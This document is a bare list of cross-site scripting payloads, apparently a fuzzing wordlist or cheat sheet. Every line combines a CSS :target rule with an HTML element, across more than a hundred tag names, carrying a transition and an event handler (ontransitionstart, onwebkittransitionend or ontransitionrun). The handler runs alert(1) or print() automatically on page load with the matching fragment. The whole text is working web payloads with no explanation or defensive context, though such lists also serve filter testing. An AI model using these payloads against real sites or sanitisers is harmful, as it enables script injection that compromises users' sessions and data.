<style>:target {color:red;}</style><area id=x style="transition:color 1s" onwebkittransitionend=alert(1)></area>
<style>:target {color:red;}</style><article id=x style="transition:color 1s" ontransitionstart=alert(1)></article>
<style>:target {color:red;}</style><article id=x style="transition:color 1s" onwebkittransitionend=alert(1)></article>
<style>:target {color:red;}</style><aside id=x style="transition:color 1s" ontransitionstart=alert(1)></aside>
<style>:target {color:red;}</style><aside id=x style="transition:color 1s" onwebkittransitionend=alert(1)></aside>
<style>:target {color:red;}</style><audio id=x style="transition:color 1s" ontransitionstart=alert(1)></audio>
<style>:target {color:red;}</style><audio id=x style="transition:color 1s" onwebkittransitionend=alert(1)></audio>
<style>:target {color:red;}</style><audio2 id=x style="transition:color 1s" ontransitionstart=alert(1)></audio2>
<style>:target {color:red;}</style><audio2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></audio2>
<style>:target {color:red;}</style><b id=x style="transition:color 1s" ontransitionstart=alert(1)></b>
<style>:target {color:red;}</style><b id=x style="transition:color 1s" onwebkittransitionend=alert(1)></b>
<style>:target {color:red;}</style><bdi id=x style="transition:color 1s" ontransitionstart=alert(1)></bdi>
<style>:target {color:red;}</style><bdi id=x style="transition:color 1s" onwebkittransitionend=alert(1)></bdi>
<style>:target {color:red;}</style><bdo id=x style="transition:color 1s" ontransitionstart=alert(1)></bdo>
<style>:target {color:red;}</style><bdo id=x style="transition:color 1s" onwebkittransitionend=alert(1)></bdo>
<style>:target {color:red;}</style><big id=x style="transition:color 1s" ontransitionstart=alert(1)></big>
<style>:target {color:red;}</style><big id=x style="transition:color 1s" onwebkittransitionend=alert(1)></big>
<style>:target {color:red;}</style><blink id=x style="transition:color 1s" ontransitionstart=alert(1)></blink>
<style>:target {color:red;}</style><blink id=x style="transition:color 1s" onwebkittransitionend=alert(1)></blink>
<style>:target {color:red;}</style><blockquote id=x style="transition:color 1s" ontransitionstart=alert(1)></blockquote>
<style>:target {color:red;}</style><blockquote id=x style="transition:color 1s" onwebkittransitionend=alert(1)></blockquote>
<style>:target {color:red;}</style><body id=x style="transition:color 1s" ontransitionstart=alert(1)></body>
<style>:target {color:red;}</style><body id=x style="transition:color 1s" onwebkittransitionend=alert(1)></body>
<style>:target {color:red;}</style><br id=x style="transition:color 1s" ontransitionstart=alert(1)></br>
<style>:target {color:red;}</style><br id=x style="transition:color 1s" onwebkittransitionend=alert(1)></br>
<style>:target {color:red;}</style><button id=x style="transition:color 1s" ontransitionstart=alert(1)></button>
<style>:target {color:red;}</style><button id=x style="transition:color 1s" onwebkittransitionend=alert(1)></button>
<style>:target {color:red;}</style><canvas id=x style="transition:color 1s" ontransitionstart=alert(1)></canvas>
<style>:target {color:red;}</style><canvas id=x style="transition:color 1s" onwebkittransitionend=alert(1)></canvas>
<style>:target {color:red;}</style><caption id=x style="transition:color 1s" ontransitionstart=alert(1)></caption>
<style>:target {color:red;}</style><caption id=x style="transition:color 1s" onwebkittransitionend=alert(1)></caption>
<style>:target {color:red;}</style><center id=x style="transition:color 1s" ontransitionstart=alert(1)></center>
<style>:target {color:red;}</style><center id=x style="transition:color 1s" onwebkittransitionend=alert(1)></center>
<style>:target {color:red;}</style><cite id=x style="transition:color 1s" ontransitionstart=alert(1)></cite>
<style>:target {color:red;}</style><cite id=x style="transition:color 1s" onwebkittransitionend=alert(1)></cite>
<style>:target {color:red;}</style><code id=x style="transition:color 1s" ontransitionstart=alert(1)></code>
<style>:target {color:red;}</style><code id=x style="transition:color 1s" onwebkittransitionend=alert(1)></code>
<style>:target {color:red;}</style><col id=x style="transition:color 1s" ontransitionstart=alert(1)></col>
<style>:target {color:red;}</style><col id=x style="transition:color 1s" onwebkittransitionend=alert(1)></col>
<style>:target {color:red;}</style><colgroup id=x style="transition:color 1s" ontransitionstart=alert(1)></colgroup>
<style>:target {color:red;}</style><colgroup id=x style="transition:color 1s" onwebkittransitionend=alert(1)></colgroup>
<style>:target {color:red;}</style><command id=x style="transition:color 1s" ontransitionstart=alert(1)></command>
<style>:target {color:red;}</style><command id=x style="transition:color 1s" onwebkittransitionend=alert(1)></command>
<style>:target {color:red;}</style><content id=x style="transition:color 1s" ontransitionstart=alert(1)></content>
<style>:target {color:red;}</style><content id=x style="transition:color 1s" onwebkittransitionend=alert(1)></content>
<style>:target {color:red;}</style><custom tags id=x style="transition:color 1s" ontransitionstart=alert(1)></custom tags>
<style>:target {color:red;}</style><custom tags id=x style="transition:color 1s" onwebkittransitionend=alert(1)></custom tags>
<style>:target {color:red;}</style><data id=x style="transition:color 1s" ontransitionstart=alert(1)></data>
<style>:target {color:red;}</style><data id=x style="transition:color 1s" onwebkittransitionend=alert(1)></data>
<style>:target {color:red;}</style><datalist id=x style="transition:color 1s" ontransitionstart=alert(1)></datalist>
<style>:target {color:red;}</style><datalist id=x style="transition:color 1s" onwebkittransitionend=alert(1)></datalist>
<style>:target {color:red;}</style><dd id=x style="transition:color 1s" ontransitionstart=alert(1)></dd>
<style>:target {color:red;}</style><dd id=x style="transition:color 1s" onwebkittransitionend=alert(1)></dd>
<style>:target {color:red;}</style><del id=x style="transition:color 1s" ontransitionstart=alert(1)></del>
<style>:target {color:red;}</style><del id=x style="transition:color 1s" onwebkittransitionend=alert(1)></del>
<style>:target {color:red;}</style><details id=x style="transition:color 1s" ontransitionstart=alert(1)></details>
<style>:target {color:red;}</style><details id=x style="transition:color 1s" onwebkittransitionend=alert(1)></details>
<style>:target {color:red;}</style><dfn id=x style="transition:color 1s" ontransitionstart=alert(1)></dfn>
<style>:target {color:red;}</style><dfn id=x style="transition:color 1s" onwebkittransitionend=alert(1)></dfn>
<style>:target {color:red;}</style><dialog id=x style="transition:color 1s" ontransitionstart=alert(1)></dialog>
<style>:target {color:red;}</style><dialog id=x style="transition:color 1s" onwebkittransitionend=alert(1)></dialog>
<style>:target {color:red;}</style><dir id=x style="transition:color 1s" ontransitionstart=alert(1)></dir>
<style>:target {color:red;}</style><dir id=x style="transition:color 1s" onwebkittransitionend=alert(1)></dir>
<style>:target {color:red;}</style><div id=x style="transition:color 1s" ontransitionstart=alert(1)></div>
<style>:target {color:red;}</style><div id=x style="transition:color 1s" onwebkittransitionend=alert(1)></div>
<style>:target {color:red;}</style><dl id=x style="transition:color 1s" ontransitionstart=alert(1)></dl>
<style>:target {color:red;}</style><dl id=x style="transition:color 1s" onwebkittransitionend=alert(1)></dl>
<style>:target {color:red;}</style><dt id=x style="transition:color 1s" ontransitionstart=alert(1)></dt>
<style>:target {color:red;}</style><dt id=x style="transition:color 1s" onwebkittransitionend=alert(1)></dt>
<style>:target {color:red;}</style><element id=x style="transition:color 1s" ontransitionstart=alert(1)></element>
<style>:target {color:red;}</style><element id=x style="transition:color 1s" onwebkittransitionend=alert(1)></element>
<style>:target {color:red;}</style><em id=x style="transition:color 1s" ontransitionstart=alert(1)></em>
<style>:target {color:red;}</style><em id=x style="transition:color 1s" onwebkittransitionend=alert(1)></em>
<style>:target {color:red;}</style><embed id=x style="transition:color 1s" ontransitionstart=alert(1)></embed>
<style>:target {color:red;}</style><embed id=x style="transition:color 1s" onwebkittransitionend=alert(1)></embed>
<style>:target {color:red;}</style><fieldset id=x style="transition:color 1s" ontransitionstart=alert(1)></fieldset>
<style>:target {color:red;}</style><fieldset id=x style="transition:color 1s" onwebkittransitionend=alert(1)></fieldset>
<style>:target {color:red;}</style><figcaption id=x style="transition:color 1s" ontransitionstart=alert(1)></figcaption>
<style>:target {color:red;}</style><figcaption id=x style="transition:color 1s" onwebkittransitionend=alert(1)></figcaption>
<style>:target {color:red;}</style><figure id=x style="transition:color 1s" ontransitionstart=alert(1)></figure>
<style>:target {color:red;}</style><figure id=x style="transition:color 1s" onwebkittransitionend=alert(1)></figure>
<style>:target {color:red;}</style><font id=x style="transition:color 1s" ontransitionstart=alert(1)></font>
<style>:target {color:red;}</style><font id=x style="transition:color 1s" onwebkittransitionend=alert(1)></font>
<style>:target {color:red;}</style><footer id=x style="transition:color 1s" ontransitionstart=alert(1)></footer>
<style>:target {color:red;}</style><footer id=x style="transition:color 1s" onwebkittransitionend=alert(1)></footer>
<style>:target {color:red;}</style><form id=x style="transition:color 1s" ontransitionstart=alert(1)></form>
<style>:target {color:red;}</style><form id=x style="transition:color 1s" onwebkittransitionend=alert(1)></form>
<style>:target {color:red;}</style><frame id=x style="transition:color 1s" ontransitionstart=alert(1)></frame>
<style>:target {color:red;}</style><frame id=x style="transition:color 1s" onwebkittransitionend=alert(1)></frame>
<style>:target {color:red;}</style><frameset id=x style="transition:color 1s" ontransitionstart=alert(1)></frameset>
<style>:target {color:red;}</style><frameset id=x style="transition:color 1s" onwebkittransitionend=alert(1)></frameset>
<style>:target {color:red;}</style><h1 id=x style="transition:color 1s" ontransitionstart=alert(1)></h1>
<style>:target {color:red;}</style><h1 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></h1>
<style>:target {color:red;}</style><head id=x style="transition:color 1s" ontransitionstart=alert(1)></head>
<style>:target {color:red;}</style><head id=x style="transition:color 1s" onwebkittransitionend=alert(1)></head>
<style>:target {color:red;}</style><header id=x style="transition:color 1s" ontransitionstart=alert(1)></header>
<style>:target {color:red;}</style><header id=x style="transition:color 1s" onwebkittransitionend=alert(1)></header>
<style>:target {color:red;}</style><hgroup id=x style="transition:color 1s" ontransitionstart=alert(1)></hgroup>
<style>:target {color:red;}</style><hgroup id=x style="transition:color 1s" onwebkittransitionend=alert(1)></hgroup>
<style>:target {color:red;}</style><hr id=x style="transition:color 1s" ontransitionstart=alert(1)></hr>
<style>:target {color:red;}</style><hr id=x style="transition:color 1s" onwebkittransitionend=alert(1)></hr>
<style>:target {color:red;}</style><html id=x style="transition:color 1s" ontransitionstart=alert(1)></html>
<style>:target {color:red;}</style><html id=x style="transition:color 1s" onwebkittransitionend=alert(1)></html>
<style>:target {color:red;}</style><i id=x style="transition:color 1s" ontransitionstart=alert(1)></i>
<style>:target {color:red;}</style><i id=x style="transition:color 1s" onwebkittransitionend=alert(1)></i>
<style>:target {color:red;}</style><iframe id=x style="transition:color 1s" ontransitionstart=alert(1)></iframe>
<style>:target {color:red;}</style><iframe id=x style="transition:color 1s" onwebkittransitionend=alert(1)></iframe>
<style>:target {color:red;}</style><iframe2 id=x style="transition:color 1s" ontransitionstart=alert(1)></iframe2>
<style>:target {color:red;}</style><iframe2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></iframe2>
<style>:target {color:red;}</style><image id=x style="transition:color 1s" ontransitionstart=alert(1)></image>
<style>:target {color:red;}</style><image id=x style="transition:color 1s" onwebkittransitionend=alert(1)></image>
<style>:target {color:red;}</style><image2 id=x style="transition:color 1s" ontransitionstart=alert(1)></image2>
<style>:target {color:red;}</style><image2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></image2>
<style>:target {color:red;}</style><image3 id=x style="transition:color 1s" ontransitionstart=alert(1)></image3>
<style>:target {color:red;}</style><image3 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></image3>
<style>:target {color:red;}</style><img id=x style="transition:color 1s" ontransitionstart=alert(1)></img>
<style>:target {color:red;}</style><img id=x style="transition:color 1s" onwebkittransitionend=alert(1)></img>
<style>:target {color:red;}</style><img2 id=x style="transition:color 1s" ontransitionstart=alert(1)></img2>
<style>:target {color:red;}</style><img2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></img2>
<style>:target {color:red;}</style><input id=x style="transition:color 1s" ontransitionstart=alert(1)></input>
<style>:target {color:red;}</style><input id=x style="transition:color 1s" onwebkittransitionend=alert(1)></input>
<style>:target {color:red;}</style><input2 id=x style="transition:color 1s" ontransitionstart=alert(1)></input2>
<style>:target {color:red;}</style><input2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></input2>
<style>:target {color:red;}</style><input3 id=x style="transition:color 1s" ontransitionstart=alert(1)></input3>
<style>:target {color:red;}</style><input3 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></input3>
<style>:target {color:red;}</style><input4 id=x style="transition:color 1s" ontransitionstart=alert(1)></input4>
<style>:target {color:red;}</style><input4 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></input4>
<style>:target {color:red;}</style><ins id=x style="transition:color 1s" ontransitionstart=alert(1)></ins>
<style>:target {color:red;}</style><ins id=x style="transition:color 1s" onwebkittransitionend=alert(1)></ins>
<style>:target {color:red;}</style><kbd id=x style="transition:color 1s" ontransitionstart=alert(1)></kbd>
<style>:target {color:red;}</style><kbd id=x style="transition:color 1s" onwebkittransitionend=alert(1)></kbd>
<style>:target {color:red;}</style><keygen id=x style="transition:color 1s" ontransitionstart=alert(1)></keygen>
<style>:target {color:red;}</style><keygen id=x style="transition:color 1s" onwebkittransitionend=alert(1)></keygen>
<style>:target {color:red;}</style><label id=x style="transition:color 1s" ontransitionstart=alert(1)></label>
<style>:target {color:red;}</style><label id=x style="transition:color 1s" onwebkittransitionend=alert(1)></label>
<style>:target {color:red;}</style><legend id=x style="transition:color 1s" ontransitionstart=alert(1)></legend>
<style>:target {color:red;}</style><legend id=x style="transition:color 1s" onwebkittransitionend=alert(1)></legend>
<style>:target {color:red;}</style><li id=x style="transition:color 1s" ontransitionstart=alert(1)></li>
<style>:target {color:red;}</style><li id=x style="transition:color 1s" onwebkittransitionend=alert(1)></li>
<style>:target {color:red;}</style><link id=x style="transition:color 1s" ontransitionstart=alert(1)></link>
<style>:target {color:red;}</style><link id=x style="transition:color 1s" onwebkittransitionend=alert(1)></link>
<style>:target {color:red;}</style><listing id=x style="transition:color 1s" ontransitionstart=alert(1)></listing>
<style>:target {color:red;}</style><listing id=x style="transition:color 1s" onwebkittransitionend=alert(1)></listing>
<style>:target {color:red;}</style><main id=x style="transition:color 1s" ontransitionstart=alert(1)></main>
<style>:target {color:red;}</style><main id=x style="transition:color 1s" onwebkittransitionend=alert(1)></main>
<style>:target {color:red;}</style><map id=x style="transition:color 1s" ontransitionstart=alert(1)></map>
<style>:target {color:red;}</style><map id=x style="transition:color 1s" onwebkittransitionend=alert(1)></map>
<style>:target {color:red;}</style><mark id=x style="transition:color 1s" ontransitionstart=alert(1)></mark>
<style>:target {color:red;}</style><mark id=x style="transition:color 1s" onwebkittransitionend=alert(1)></mark>
<style>:target {color:red;}</style><marquee id=x style="transition:color 1s" ontransitionstart=alert(1)></marquee>
<style>:target {color:red;}</style><marquee id=x style="transition:color 1s" onwebkittransitionend=alert(1)></marquee>
<style>:target {color:red;}</style><menu id=x style="transition:color 1s" ontransitionstart=alert(1)></menu>
<style>:target {color:red;}</style><menu id=x style="transition:color 1s" onwebkittransitionend=alert(1)></menu>
<style>:target {color:red;}</style><menuitem id=x style="transition:color 1s" ontransitionstart=alert(1)></menuitem>
<style>:target {color:red;}</style><menuitem id=x style="transition:color 1s" onwebkittransitionend=alert(1)></menuitem>
<style>:target {color:red;}</style><meta id=x style="transition:color 1s" ontransitionstart=alert(1)></meta>
<style>:target {color:red;}</style><meta id=x style="transition:color 1s" onwebkittransitionend=alert(1)></meta>
<style>:target {color:red;}</style><meter id=x style="transition:color 1s" ontransitionstart=alert(1)></meter>
<style>:target {color:red;}</style><meter id=x style="transition:color 1s" onwebkittransitionend=alert(1)></meter>
<style>:target {color:red;}</style><multicol id=x style="transition:color 1s" ontransitionstart=alert(1)></multicol>
<style>:target {color:red;}</style><multicol id=x style="transition:color 1s" onwebkittransitionend=alert(1)></multicol>
<style>:target {color:red;}</style><nav id=x style="transition:color 1s" ontransitionstart=alert(1)></nav>
<style>:target {color:red;}</style><nav id=x style="transition:color 1s" onwebkittransitionend=alert(1)></nav>
<style>:target {color:red;}</style><nextid id=x style="transition:color 1s" ontransitionstart=alert(1)></nextid>
<style>:target {color:red;}</style><nextid id=x style="transition:color 1s" onwebkittransitionend=alert(1)></nextid>
<style>:target {color:red;}</style><nobr id=x style="transition:color 1s" ontransitionstart=alert(1)></nobr>
<style>:target {color:red;}</style><nobr id=x style="transition:color 1s" onwebkittransitionend=alert(1)></nobr>
<style>:target {color:red;}</style><noembed id=x style="transition:color 1s" ontransitionstart=alert(1)></noembed>
<style>:target {color:red;}</style><noembed id=x style="transition:color 1s" onwebkittransitionend=alert(1)></noembed>
<style>:target {color:red;}</style><noframes id=x style="transition:color 1s" ontransitionstart=alert(1)></noframes>
<style>:target {color:red;}</style><noframes id=x style="transition:color 1s" onwebkittransitionend=alert(1)></noframes>
<style>:target {color:red;}</style><noscript id=x style="transition:color 1s" ontransitionstart=alert(1)></noscript>
<style>:target {color:red;}</style><noscript id=x style="transition:color 1s" onwebkittransitionend=alert(1)></noscript>
<style>:target {color:red;}</style><object id=x style="transition:color 1s" ontransitionstart=alert(1)></object>
<style>:target {color:red;}</style><object id=x style="transition:color 1s" onwebkittransitionend=alert(1)></object>
<style>:target {color:red;}</style><ol id=x style="transition:color 1s" ontransitionstart=alert(1)></ol>
<style>:target {color:red;}</style><ol id=x style="transition:color 1s" onwebkittransitionend=alert(1)></ol>
<style>:target {color:red;}</style><optgroup id=x style="transition:color 1s" ontransitionstart=alert(1)></optgroup>
<style>:target {color:red;}</style><optgroup id=x style="transition:color 1s" onwebkittransitionend=alert(1)></optgroup>
<style>:target {color:red;}</style><option id=x style="transition:color 1s" ontransitionstart=alert(1)></option>
<style>:target {color:red;}</style><option id=x style="transition:color 1s" onwebkittransitionend=alert(1)></option>
<style>:target {color:red;}</style><output id=x style="transition:color 1s" ontransitionstart=alert(1)></output>
<style>:target {color:red;}</style><output id=x style="transition:color 1s" onwebkittransitionend=alert(1)></output>
<style>:target {color:red;}</style><p id=x style="transition:color 1s" ontransitionstart=alert(1)></p>
<style>:target {color:red;}</style><p id=x style="transition:color 1s" onwebkittransitionend=alert(1)></p>
<style>:target {color:red;}</style><param id=x style="transition:color 1s" ontransitionstart=alert(1)></param>
<style>:target {color:red;}</style><param id=x style="transition:color 1s" onwebkittransitionend=alert(1)></param>
<style>:target {color:red;}</style><picture id=x style="transition:color 1s" ontransitionstart=alert(1)></picture>
<style>:target {color:red;}</style><picture id=x style="transition:color 1s" onwebkittransitionend=alert(1)></picture>
<style>:target {color:red;}</style><plaintext id=x style="transition:color 1s" ontransitionstart=alert(1)></plaintext>
<style>:target {color:red;}</style><plaintext id=x style="transition:color 1s" onwebkittransitionend=alert(1)></plaintext>
<style>:target {color:red;}</style><pre id=x style="transition:color 1s" ontransitionstart=alert(1)></pre>
<style>:target {color:red;}</style><pre id=x style="transition:color 1s" onwebkittransitionend=alert(1)></pre>
<style>:target {color:red;}</style><progress id=x style="transition:color 1s" ontransitionstart=alert(1)></progress>
<style>:target {color:red;}</style><progress id=x style="transition:color 1s" onwebkittransitionend=alert(1)></progress>
<style>:target {color:red;}</style><q id=x style="transition:color 1s" ontransitionstart=alert(1)></q>
<style>:target {color:red;}</style><q id=x style="transition:color 1s" onwebkittransitionend=alert(1)></q>
<style>:target {color:red;}</style><rb id=x style="transition:color 1s" ontransitionstart=alert(1)></rb>
<style>:target {color:red;}</style><rb id=x style="transition:color 1s" onwebkittransitionend=alert(1)></rb>
<style>:target {color:red;}</style><rp id=x style="transition:color 1s" ontransitionstart=alert(1)></rp>
<style>:target {color:red;}</style><rp id=x style="transition:color 1s" onwebkittransitionend=alert(1)></rp>
<style>:target {color:red;}</style><rt id=x style="transition:color 1s" ontransitionstart=alert(1)></rt>
<style>:target {color:red;}</style><rt id=x style="transition:color 1s" onwebkittransitionend=alert(1)></rt>
<style>:target {color:red;}</style><rtc id=x style="transition:color 1s" ontransitionstart=alert(1)></rtc>
<style>:target {color:red;}</style><rtc id=x style="transition:color 1s" onwebkittransitionend=alert(1)></rtc>
<style>:target {color:red;}</style><ruby id=x style="transition:color 1s" ontransitionstart=alert(1)></ruby>
<style>:target {color:red;}</style><ruby id=x style="transition:color 1s" onwebkittransitionend=alert(1)></ruby>
<style>:target {color:red;}</style><s id=x style="transition:color 1s" ontransitionstart=alert(1)></s>
<style>:target {color:red;}</style><s id=x style="transition:color 1s" onwebkittransitionend=alert(1)></s>
<style>:target {color:red;}</style><samp id=x style="transition:color 1s" ontransitionstart=alert(1)></samp>
<style>:target {color:red;}</style><samp id=x style="transition:color 1s" onwebkittransitionend=alert(1)></samp>
<style>:target {color:red;}</style><script id=x style="transition:color 1s" ontransitionstart=alert(1)></script>
<style>:target {color:red;}</style><script id=x style="transition:color 1s" onwebkittransitionend=alert(1)></script>
<style>:target {color:red;}</style><section id=x style="transition:color 1s" ontransitionstart=alert(1)></section>
<style>:target {color:red;}</style><section id=x style="transition:color 1s" onwebkittransitionend=alert(1)></section>
<style>:target {color:red;}</style><select id=x style="transition:color 1s" ontransitionstart=alert(1)></select>
<style>:target {color:red;}</style><select id=x style="transition:color 1s" onwebkittransitionend=alert(1)></select>
<style>:target {color:red;}</style><set id=x style="transition:color 1s" ontransitionstart=alert(1)></set>
<style>:target {color:red;}</style><set id=x style="transition:color 1s" onwebkittransitionend=alert(1)></set>
<style>:target {color:red;}</style><shadow id=x style="transition:color 1s" ontransitionstart=alert(1)></shadow>
<style>:target {color:red;}</style><shadow id=x style="transition:color 1s" onwebkittransitionend=alert(1)></shadow>
<style>:target {color:red;}</style><slot id=x style="transition:color 1s" ontransitionstart=alert(1)></slot>
<style>:target {color:red;}</style><slot id=x style="transition:color 1s" onwebkittransitionend=alert(1)></slot>
<style>:target {color:red;}</style><small id=x style="transition:color 1s" ontransitionstart=alert(1)></small>
<style>:target {color:red;}</style><small id=x style="transition:color 1s" onwebkittransitionend=alert(1)></small>
<style>:target {color:red;}</style><source id=x style="transition:color 1s" ontransitionstart=alert(1)></source>
<style>:target {color:red;}</style><source id=x style="transition:color 1s" onwebkittransitionend=alert(1)></source>
<style>:target {color:red;}</style><spacer id=x style="transition:color 1s" ontransitionstart=alert(1)></spacer>
<style>:target {color:red;}</style><spacer id=x style="transition:color 1s" onwebkittransitionend=alert(1)></spacer>
<style>:target {color:red;}</style><span id=x style="transition:color 1s" ontransitionstart=alert(1)></span>
<style>:target {color:red;}</style><span id=x style="transition:color 1s" onwebkittransitionend=alert(1)></span>
<style>:target {color:red;}</style><strike id=x style="transition:color 1s" ontransitionstart=alert(1)></strike>
<style>:target {color:red;}</style><strike id=x style="transition:color 1s" onwebkittransitionend=alert(1)></strike>
<style>:target {color:red;}</style><strong id=x style="transition:color 1s" ontransitionstart=alert(1)></strong>
<style>:target {color:red;}</style><strong id=x style="transition:color 1s" onwebkittransitionend=alert(1)></strong>
<style>:target {color:red;}</style><style id=x style="transition:color 1s" ontransitionstart=alert(1)></style>
<style>:target {color:red;}</style><style id=x style="transition:color 1s" onwebkittransitionend=alert(1)></style>
<style>:target {color:red;}</style><sub id=x style="transition:color 1s" ontransitionstart=alert(1)></sub>
<style>:target {color:red;}</style><sub id=x style="transition:color 1s" onwebkittransitionend=alert(1)></sub>
<style>:target {color:red;}</style><summary id=x style="transition:color 1s" ontransitionstart=alert(1)></summary>
<style>:target {color:red;}</style><summary id=x style="transition:color 1s" onwebkittransitionend=alert(1)></summary>
<style>:target {color:red;}</style><sup id=x style="transition:color 1s" ontransitionstart=alert(1)></sup>
<style>:target {color:red;}</style><sup id=x style="transition:color 1s" onwebkittransitionend=alert(1)></sup>
<style>:target {color:red;}</style><svg id=x style="transition:color 1s" ontransitionstart=alert(1)></svg>
<style>:target {color:red;}</style><svg id=x style="transition:color 1s" onwebkittransitionend=alert(1)></svg>
<style>:target {color:red;}</style><table id=x style="transition:color 1s" ontransitionstart=alert(1)></table>
<style>:target {color:red;}</style><table id=x style="transition:color 1s" onwebkittransitionend=alert(1)></table>
<style>:target {color:red;}</style><tbody id=x style="transition:color 1s" ontransitionstart=alert(1)></tbody>
<style>:target {color:red;}</style><tbody id=x style="transition:color 1s" onwebkittransitionend=alert(1)></tbody>
<style>:target {color:red;}</style><td id=x style="transition:color 1s" ontransitionstart=alert(1)></td>
<style>:target {color:red;}</style><td id=x style="transition:color 1s" onwebkittransitionend=alert(1)></td>
<style>:target {color:red;}</style><template id=x style="transition:color 1s" ontransitionstart=alert(1)></template>
<style>:target {color:red;}</style><template id=x style="transition:color 1s" onwebkittransitionend=alert(1)></template>
<style>:target {color:red;}</style><textarea id=x style="transition:color 1s" ontransitionstart=alert(1)></textarea>
<style>:target {color:red;}</style><textarea id=x style="transition:color 1s" onwebkittransitionend=alert(1)></textarea>
<style>:target {color:red;}</style><tfoot id=x style="transition:color 1s" ontransitionstart=alert(1)></tfoot>
<style>:target {color:red;}</style><tfoot id=x style="transition:color 1s" onwebkittransitionend=alert(1)></tfoot>
<style>:target {color:red;}</style><th id=x style="transition:color 1s" ontransitionstart=alert(1)></th>
<style>:target {color:red;}</style><th id=x style="transition:color 1s" onwebkittransitionend=alert(1)></th>
<style>:target {color:red;}</style><thead id=x style="transition:color 1s" ontransitionstart=alert(1)></thead>
<style>:target {color:red;}</style><thead id=x style="transition:color 1s" onwebkittransitionend=alert(1)></thead>
<style>:target {color:red;}</style><time id=x style="transition:color 1s" ontransitionstart=alert(1)></time>
<style>:target {color:red;}</style><time id=x style="transition:color 1s" onwebkittransitionend=alert(1)></time>
<style>:target {color:red;}</style><title id=x style="transition:color 1s" ontransitionstart=alert(1)></title>
<style>:target {color:red;}</style><title id=x style="transition:color 1s" onwebkittransitionend=alert(1)></title>
<style>:target {color:red;}</style><tr id=x style="transition:color 1s" ontransitionstart=alert(1)></tr>
<style>:target {color:red;}</style><tr id=x style="transition:color 1s" onwebkittransitionend=alert(1)></tr>
<style>:target {color:red;}</style><track id=x style="transition:color 1s" ontransitionstart=alert(1)></track>
<style>:target {color:red;}</style><track id=x style="transition:color 1s" onwebkittransitionend=alert(1)></track>
<style>:target {color:red;}</style><tt id=x style="transition:color 1s" ontransitionstart=alert(1)></tt>
<style>:target {color:red;}</style><tt id=x style="transition:color 1s" onwebkittransitionend=alert(1)></tt>
<style>:target {color:red;}</style><u id=x style="transition:color 1s" ontransitionstart=alert(1)></u>
<style>:target {color:red;}</style><u id=x style="transition:color 1s" onwebkittransitionend=alert(1)></u>
<style>:target {color:red;}</style><ul id=x style="transition:color 1s" ontransitionstart=alert(1)></ul>
<style>:target {color:red;}</style><ul id=x style="transition:color 1s" onwebkittransitionend=alert(1)></ul>
<style>:target {color:red;}</style><var id=x style="transition:color 1s" ontransitionstart=alert(1)></var>
<style>:target {color:red;}</style><var id=x style="transition:color 1s" onwebkittransitionend=alert(1)></var>
<style>:target {color:red;}</style><video id=x style="transition:color 1s" ontransitionstart=alert(1)></video>
<style>:target {color:red;}</style><video id=x style="transition:color 1s" onwebkittransitionend=alert(1)></video>
<style>:target {color:red;}</style><video2 id=x style="transition:color 1s" ontransitionstart=alert(1)></video2>
<style>:target {color:red;}</style><video2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></video2>
<style>:target {color:red;}</style><wbr id=x style="transition:color 1s" ontransitionstart=alert(1)></wbr>
<style>:target {color:red;}</style><wbr id=x style="transition:color 1s" onwebkittransitionend=alert(1)></wbr>
<style>:target {color:red;}</style><xmp id=x style="transition:color 1s" ontransitionstart=alert(1)></xmp>
<style>:target {color:red;}</style><xmp id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xmp>
<style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=print()></a>
<style>:target {transform: rotate(180deg);}</style><a2 id=x style="transition:transform 2s" ontransitionrun=print()></a2>
<style>:target {transform: rotate(180deg);}</style><abbr id=x style="transition:transform 2s" ontransitionrun=print()></abbr>
<style>:target {transform: rotate(180deg);}</style><acronym id=x style="transition:transform 2s" ontransitionrun=print()></acronym>
<style>:target {transform: rotate(180deg);}</style><address id=x style="transition:transform 2s" ontransitionrun=print()></address>
<style>:target {transform: rotate(180deg);}</style><animate id=x style="transition:transform 2s" ontransitionrun=print()></animate>
<style>:target {transform: rotate(180deg);}</style><animatemotion id=x style="transition:transform 2s" ontransitionrun=print()></animatemotion>
<style>:target {transform: rotate(180deg);}</style><animatetransform id=x style="transition:transform 2s" ontransitionrun=print()></animatetransform>
<style>:target {transform: rotate(180deg);}</style><applet id=x style="transition:transform 2s" ontransitionrun=print()></applet>
<style>:target {transform: rotate(180deg);}</style><area id=x style="transition:transform 2s" ontransitionrun=print()></area>
<style>:target {transform: rotate(180deg);}</style><article id=x style="transition:transform 2s" ontransitionrun=print()></article>
<style>:target {transform: rotate(180deg);}</style><aside id=x style="transition:transform 2s" ontransitionrun=print()></aside>
<style>:target {transform: rotate(180deg);}</style><audio id=x style="transition:transform 2s" ontransitionrun=print()></audio>
<style>:target {transform: rotate(180deg);}</style><audio2 id=x style="transition:transform 2s" ontransitionrun=print()></audio2>
<style>:target {transform: rotate(180deg);}</style><b id=x style="transition:transform 2s" ontransitionrun=print()></b>
<style>:target {transform: rotate(180deg);}</style><bdi id=x style="transition:transform 2s" ontransitionrun=print()></bdi>
<style>:target {transform: rotate(180deg);}</style><bdo id=x style="transition:transform 2s" ontransitionrun=print()></bdo>
<style>:target {transform: rotate(180deg);}</style><big id=x style="transition:transform 2s" ontransitionrun=print()></big>
<style>:target {transform: rotate(180deg);}</style><blink id=x style="transition:transform 2s" ontransitionrun=print()></blink>
<style>:target {transform: rotate(180deg);}</style><blockquote id=x style="transition:transform 2s" ontransitionrun=print()></blockquote>
<style>:target {transform: rotate(180deg);}</style><body id=x style="transition:transform 2s" ontransitionrun=print()></body>
<style>:target {transform: rotate(180deg);}</style><br id=x style="transition:transform 2s" ontransitionrun=print()></br>
<style>:target {transform: rotate(180deg);}</style><button id=x style="transition:transform 2s" ontransitionrun=print()></button>
<style>:target {transform: rotate(180deg);}</style><canvas id=x style="transition:transform 2s" ontransitionrun=print()></canvas>
<style>:target {transform: rotate(180deg);}</style><caption id=x style="transition:transform 2s" ontransitionrun=print()></caption>
